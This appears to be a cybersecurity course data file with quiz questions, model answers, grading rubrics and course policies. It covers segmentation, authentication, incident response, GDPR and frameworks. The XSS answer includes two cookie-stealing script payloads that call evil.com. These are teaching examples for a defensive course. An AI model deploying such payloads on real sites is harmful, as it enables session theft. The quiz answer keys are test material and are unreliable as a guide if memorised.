Segment 2 - DMZ: Web server (reverse proxy and static content) in the DMZ. Only the web server is directly reachable from the internet. Segment 3 - Application tier: Internal firewall between DMZ and app tier. Application server only accepts connections from the web server on specific ports. No direct internet access. Segment 4 - Data tier: Second firewall or strict ACL between app and data tiers. Database server only accepts connections from the application server on the database port. No direct internet or DMZ access. Additional controls: WAF in front of the web server for application-layer attack prevention. Network IDS monitoring all segments. Centralized logging with SIEM. VPN for administrative access with MFA required. Egress filtering blocking unauthorized outbound connections. All management traffic on a separate out-of-band management network.

rubric.key: Correct three-tier segmentation with appropriate device placement
Accurate traffic flow rules between segments
Additional security controls beyond basic architecture

questions.question: Compare FIDO2/WebAuthn passwordless authentication with traditional password plus TOTP multi-factor authentication. Explain the security advantages and one practical limitation of each approach.
questions.answer: FIDO2/WebAuthn: Uses public key cryptography where the private key never leaves the authenticator device. Each registration creates a unique key pair bound to the specific origin domain, making credential phishing impossible because the credential only works on the registered domain. Resistant to replay attacks, server-side credential database breaches (server stores only public keys), and man-in-the-middle attacks. Limitation: Requires compatible hardware authenticator or platform authenticator; device loss requires recovery procedures; not yet universally supported by all applications. Password+TOTP: Something you know (password) plus something you have (phone generating time-based codes). Significantly better than password alone. Limitation: TOTP codes can be phished in real-time through adversary-in-the-middle proxy attacks (e.g., Evilginx2) where the attacker relays the TOTP code to the real server. Password component remains vulnerable to credential database breaches if stored with weak hashing. Security comparison: FIDO2 is fundamentally phishing-resistant by design; TOTP is phishable.

rubric.key: Correct description of FIDO2 security model with origin binding
Correct description of TOTP with phishability limitation
Valid practical limitation for each approach

questions.question: A company's endpoint detection system alerts on suspicious PowerShell activity on a workstation. The PowerShell process was spawned by Microsoft Word, is running encoded commands, and is making outbound HTTPS connections to an IP address not in any known threat feed. Classify the malware type, explain the attack technique, and describe the incident response steps in order.
questions.answer: Malware type: Fileless malware delivered via a macro-enabled Word document. The attack uses Living-off-the-Land techniques by abusing legitimate system tools (PowerShell) rather than dropping executable files. Attack technique: Spear phishing email delivers a Word document with malicious VBA macro. When the user enables macros, VBA spawns PowerShell with encoded (Base64) commands. PowerShell downloads and executes additional payloads in memory, establishing a command-and-control channel over HTTPS to blend with normal traffic. MITRE ATT&CK mapping: T1566.001 (Phishing Attachment), T1059.001 (PowerShell), T1027 (Obfuscated Files), T1071.001 (Web Protocols for C2). Incident response: (1) Isolate the workstation from the network immediately. (2) Capture volatile memory using a tool like FTK Imager before powering down. (3) Analyze PowerShell logs (Script Block Logging, Transcription Logging) to determine what commands were executed. (4) Decode the Base64 commands to understand the payload. (5) Check SIEM for the C2 IP across all systems to identify other compromised hosts. (6) Block the C2 IP at the firewall. (7) Investigate the original phishing email and identify all recipients. (8) Reimage the affected workstation.

rubric.key: Correct identification of fileless malware and Living-off-the-Land technique
Accurate attack chain description
Complete and ordered incident response steps

questions.question: Explain how a Stored XSS attack differs from a Reflected XSS attack. For each type, provide a specific attack scenario against an e-commerce website, show the malicious payload, and describe the defense that would prevent it.
questions.answer: Stored XSS: Malicious script is permanently stored on the target server (e.g., in a database) and executed every time a user views the affected page. Scenario: Attacker submits a product review containing: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>. The review is stored in the database and rendered on the product page. Every customer viewing the product has their session cookie sent to the attacker. Defense: Output encoding (HTML entity encoding) when rendering user content, so the browser displays the script as text rather than executing it. Content Security Policy header with script-src 'self' to prevent inline script execution. Reflected XSS: Malicious script is included in the URL or form submission and reflected back immediately in the response without storage. Scenario: Attacker crafts a URL: https://shop.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script> and sends it to victims via phishing email. The search page reflects the query parameter into the HTML without sanitization. Defense: Input validation rejecting HTML characters in search parameters, output encoding when reflecting user input, and X-XSS-Protection headers. Key difference: Stored XSS affects all users who view the page; Reflected XSS requires tricking each victim into clicking a crafted link.

rubric.key: Clear distinction between stored and reflected with correct definitions
Specific and realistic attack scenarios with payloads
Appropriate defenses for each type

questions.question: An organization deploys 500 IoT temperature sensors across its manufacturing facilities. These sensors communicate over Wi-Fi, run embedded Linux, and send data to a cloud platform via HTTP. Identify five specific security risks and propose a mitigation for each.
questions.answer: Risk 1: Default credentials on sensors. Attackers can log in and modify firmware or redirect data. Mitigation: Enforce unique credentials per device during provisioning, disable default accounts. Risk 2: Unencrypted HTTP communication exposes sensor data and management credentials to network eavesdropping. Mitigation: Upgrade to HTTPS with TLS 1.3 and certificate pinning. Use mutual TLS for device authentication. Risk 3: Lack of firmware update mechanism allows vulnerabilities to persist for the device lifetime. Mitigation: Implement secure OTA (over-the-air) firmware updates with signed images verified before installation. Risk 4: Flat network placement allows compromised sensors to be used as pivot points to attack other systems. Mitigation: Place all IoT sensors on a dedicated VLAN with firewall rules allowing only outbound HTTPS to the cloud endpoint and blocking all other traffic. Risk 5: No monitoring for anomalous behavior means compromised sensors go undetected. Mitigation: Implement network monitoring for IoT VLAN traffic, alerting on unexpected destinations, protocols, or volume changes that could indicate botnet recruitment or data exfiltration.

rubric.key: Five distinct and realistic security risks identified
Appropriate and specific mitigation for each risk
Demonstrates understanding of IoT-specific constraints

questions.question: A disgruntled former employee uses their still-active badge to enter the building after hours, accesses the server room, and connects a hardware keylogger to a domain controller. Identify all the physical security control failures and describe the specific controls that should have been in place to prevent each failure.
questions.answer: Failure 1: Badge not deactivated upon termination. Control: Automated HR integration that deactivates physical access badges simultaneously with IT account deprovisioning as part of the employee offboarding checklist, verified by a termination audit within 24 hours. Failure 2: After-hours access not restricted or monitored. Control: Time-based access restrictions limiting badge access to business hours for non-essential personnel, with after-hours access requiring manager pre-approval and generating immediate security alerts. Failure 3: Server room access not separately controlled. Control: Separate, more restrictive access control for the server room requiring multi-factor authentication (badge plus biometric or PIN) with access limited to authorized IT staff only. Failure 4: No surveillance detected the unauthorized access. Control: 24/7 video surveillance with analytics alerting on after-hours motion in sensitive areas, monitored by security operations center. Failure 5: Hardware keylogger could be physically connected. Control: Locked server cabinets with tamper detection, USB port blocking via Group Policy, and regular physical inspection of server hardware. Additionally: visitor and access logs should be reviewed regularly, and security incident response procedures should include physical security scenarios.

rubric.key: Identifies at least four distinct control failures
Proposes specific and practical preventive controls for each
Addresses the systemic offboarding process failure

questions.question: A European e-commerce company suffers a data breach exposing names, email addresses, and purchase history of 100,000 EU customers. Under GDPR, what are the company's notification obligations, what information must be included in notifications, and what penalties could they face?
questions.answer: Notification to supervisory authority: Required within 72 hours of becoming aware of the breach (Article 33). Must include: nature of the breach, categories and approximate number of data subjects affected (personal data including names, emails, purchase history for approximately 100,000 individuals), likely consequences of the breach, and measures taken or proposed to address the breach and mitigate effects. Notification to data subjects: Required without undue delay if the breach is likely to result in a high risk to the rights and freedoms of individuals (Article 34). Given that purchase history may reveal personal preferences and spending habits, and email addresses enable targeted phishing, notification to individuals is likely required. Must describe in clear and plain language: the nature of the breach, contact details of the DPO, likely consequences, and measures taken to address and mitigate. Penalties: Up to 10 million euros or 2% of global annual turnover for failure to notify (whichever is greater). Up to 20 million euros or 4% of global annual turnover for violations of data processing principles (whichever is greater). Additional liability: data subjects may claim compensation for material and non-material damage.

rubric.key: Correct 72-hour authority notification requirement with required content
Correct data subject notification analysis with justification
Accurate penalty ranges with applicable tiers

questions.question: Distinguish between data anonymization and pseudonymization. Provide a specific example of each applied to a healthcare dataset, and explain the GDPR implications of each approach for the data controller.
questions.answer: Anonymization: Irreversible removal of all identifying information such that the data subject cannot be re-identified by any means. Example: A hospital publishes aggregated statistics showing that 23% of patients in the 40-50 age group were diagnosed with hypertension in 2025. Individual patient records are not included; only aggregate counts by age group and diagnosis. GDPR implication: Truly anonymized data is no longer personal data and falls outside GDPR scope entirely. The data controller has no ongoing obligations for this data. Pseudonymization: Replacing direct identifiers with artificial tokens while maintaining the ability to re-identify with access to a separate mapping table. Example: Patient records where John Smith (MRN 12345) becomes Token_A7F3B, and the mapping table (Token_A7F3B = MRN 12345) is stored in a separate, access-controlled system. Researchers can analyze patient records by token without knowing identities, but re-identification is possible with the mapping table. GDPR implication: Pseudonymized data is still personal data under GDPR because re-identification is possible. However, GDPR explicitly encourages pseudonymization as a security measure (Article 32) and it may enable broader processing for research purposes under certain conditions.

rubric.key: Correct definitions distinguishing irreversibility
Specific and realistic healthcare examples for each
Accurate GDPR implications for each approach

quizzes.topic: Security Policies, Frameworks, and Incident Response

questions.question: An organization is deciding between adopting NIST CSF 2.0, ISO 27001, and CIS Controls v8 as their primary security framework. The organization is a mid-size financial services company with 500 employees, subject to SOX compliance, and currently has a basic security program. Recommend a framework and justify your recommendation, explaining how the other two might complement it.
questions.answer: Recommendation: Start with CIS Controls v8 Implementation Group 1 (IG1) for immediate tactical improvements, then adopt NIST CSF 2.0 as the strategic framework. Justification: CIS Controls v8 IG1 provides 56 specific, prioritized, actionable safeguards that address the most common attack vectors. For a basic security program, this provides immediate risk reduction with clear implementation guidance. NIST CSF 2.0 provides the strategic framework for organizing the overall security program around six functions (Govern, Identify, Protect, Detect, Respond, Recover), which maps well to SOX compliance requirements for demonstrating due diligence in IT controls. NIST CSF is flexible, scalable, and widely recognized by US regulators. Complementary role of ISO 27001: If the company plans to pursue international business or needs a certifiable standard for customer assurance, ISO 27001 certification can be pursued after the CIS and NIST foundations are established. ISO 27001 provides a formal Information Security Management System with audit requirements. Integration: CIS Controls map directly to NIST CSF subcategories, making them complementary rather than competing. NIST CSF provides the governance structure; CIS Controls provide the tactical implementation checklist; ISO 27001 provides the certifiable management system.

rubric.key: Clear recommendation with sound justification considering company context
Demonstrates understanding of each framework's strengths
Explains how frameworks complement each other

questions.question: Your organization's SIEM generates an alert at 2:00 AM indicating that a domain administrator account has authenticated from a VPN IP address in a country where your company has no employees. The account then ran a PowerShell script that created a new local administrator account on three servers. Walk through your incident response from detection through containment, and identify the critical evidence to preserve.
questions.answer: Detection and Analysis: (1) Validate the alert is not a false positive by checking if the DA account owner is traveling or using a VPN. Contact them immediately via out-of-band communication (phone call, not email). (2) If the owner denies the activity, escalate to confirmed security incident with high severity. (3) Analyze: check the VPN logs for the source IP, authentication method used, and any MFA bypass indicators. Containment: (4) Immediately disable the compromised domain administrator account. (5) Force disconnect the VPN session. (6) Disable the three newly created local administrator accounts. (7) Isolate the three affected servers from the network but do not power them down. (8) Reset the Kerberos KRBTGT account twice (with a 12-hour interval) if Golden Ticket attack is suspected. (9) Block the source IP at the firewall. Critical evidence to preserve: VPN authentication logs with timestamps and source IPs. Active Directory authentication logs (Event IDs 4624, 4672, 4720). PowerShell Script Block Logging from the affected servers. Memory dumps from the three servers before remediation. Network traffic captures from the SIEM for the timeframe. Command history and newly created account details. All evidence must be collected with chain of custody documentation.

rubric.key: Validates alert and establishes incident severity correctly
Comprehensive containment steps in logical order
Identifies critical evidence with preservation rationale

questions.question: Explain the difference between a security policy and a security standard using a specific example related to data encryption. Then explain why an organization needs both and what happens when one exists without the other.
questions.answer: Security Policy (the what and why): All sensitive data must be encrypted at rest and in transit to protect confidentiality and comply with regulatory requirements. Approved by the CISO, applies to all departments, reviewed annually. Security Standard (the how, specifically): Data at rest must use AES-256 encryption. Data in transit must use TLS 1.3. Key management must follow NIST SP 800-57. Certificates must use RSA-2048 or ECDSA P-256 minimum. Key rotation must occur annually for symmetric keys and every two years for asymmetric keys. Why both are needed: The policy sets the non-negotiable requirement based on business need and risk tolerance. Without a standard, different teams would implement encryption inconsistently: one team might use AES-128, another might use an outdated cipher, and a third might use TLS 1.0. The standard ensures consistent, auditable implementation. Without a policy, the standard has no authority: teams might question why encryption is required or ignore it for convenience. Policy without standard: mandates encryption but different implementations create gaps and audit failures. Standard without policy: specifies technical details but lacks executive authority and may be treated as optional guidance.

rubric.key: Clear and accurate policy example with appropriate scope
Clear and accurate standard example with specific technical requirements
Explains necessity of both with consequences of missing either

questions.question: After a ransomware incident, your organization conducts a lessons learned meeting. The investigation revealed that the ransomware entered via a phishing email to an employee in accounting, the employee's workstation had local administrator rights, the ransomware spread via SMB to file servers, and backups were encrypted because they were on network-accessible shares. List five specific, actionable improvements with implementation timelines.
questions.answer: Improvement 1 (Week 1-2): Remove local administrator rights from all standard user accounts. Implement a Privileged Access Management solution for cases where elevated privileges are needed temporarily. Timeline: Immediate for accounting department, phased rollout to all departments within two weeks. Improvement 2 (Week 1-4): Deploy advanced email security gateway with attachment sandboxing, URL rewriting, and impersonation detection. Enable macro blocking by default in Microsoft Office via Group Policy. Timeline: Configuration within one week, testing and deployment within four weeks. Improvement 3 (Week 2-6): Implement network segmentation restricting SMB traffic between workstations. Workstations should not be able to communicate with each other via SMB; only server-to-server and workstation-to-server communications should be permitted. Timeline: Network redesign within two weeks, implementation within six weeks. Improvement 4 (Week 1-2): Implement air-gapped or immutable backups. Move backup storage to offline or write-once-read-many systems that cannot be encrypted by ransomware. Test restoration procedures. Timeline: Immediate implementation of offline backup copies within one week, migration to immutable backup solution within two weeks. Improvement 5 (Month 1-3): Launch mandatory phishing awareness training program with monthly simulated phishing campaigns. Employees who fail simulations receive immediate additional training. Timeline: Training platform selection and configuration within one month, first simulation within three months.

rubric.key: Five distinct improvements addressing different root causes
Specific and actionable recommendations, not vague statements
Realistic implementation timelines prioritized by urgency

course_policies.attendance: Attendance is mandatory for all lab sessions and in-class exercises. More than 2 unexcused absences may result in a grade reduction of one letter grade. Students must notify the instructor before class if they will be absent.
course_policies.late_submissions: Late assignments are penalized 10% per day for up to 5 days. No submissions accepted more than 5 days late without prior written arrangement with the instructor. Extensions must be requested at least 48 hours before the deadline.
course_policies.collaboration: Lab exercises may be completed in pairs. All written reports and quiz responses must be individual work. Code sharing and report sharing between students is prohibited. Study groups for exam preparation are encouraged.
course_policies.academic_integrity: Unauthorized access to systems outside the lab environment is strictly prohibited and may result in expulsion. All submitted work must be original. Proper citation is required for any external sources referenced. Use of AI tools must be disclosed and the student must demonstrate understanding of all submitted content.
course_policies.technology_requirements: Students must have a laptop capable of running VirtualBox with at least 16GB RAM and 100GB free storage. Kali Linux and other required VMs will be provided. University cyber range access is included with course enrollment.
